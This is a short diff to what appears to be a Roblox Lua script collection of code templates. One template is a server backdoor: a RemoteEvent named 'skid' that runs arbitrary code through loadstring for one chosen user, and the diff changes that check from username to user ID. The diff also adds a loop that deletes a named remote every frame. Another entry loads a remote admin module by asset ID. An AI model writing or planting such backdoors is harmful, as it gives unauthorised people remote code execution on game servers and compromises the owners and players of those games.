@@ -2891,7 +2891,7 @@ local function createRemote()
     local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
     remote.Name = "skid"
     remote.OnServerEvent:Connect(function(player, SS)
-        if player.UserId == '%username%' then
+        if player.UserId == '%userid%' then
             loadstring(SS)()
         else
             --player:Kick("")
@@ -2908,6 +2908,19 @@ local function createRemote()
 end
 
 createRemote()
+]] },
+
+			{ name = "delete backdoor.txt", code = [[
+while true do
+    pcall(function()
+        if game.%s then
+            game.%s.Parent = nil
+            game.%s:Destroy()
+            print("Destroyed remote:", remote.Name)
+        end
+    end)
+    task.wait() -- runs every frame (~60 times per second)
+end
 ]] },
 
             { name = "admin panel.txt", code = "require(12159842278).ADMIN('%username%')" },
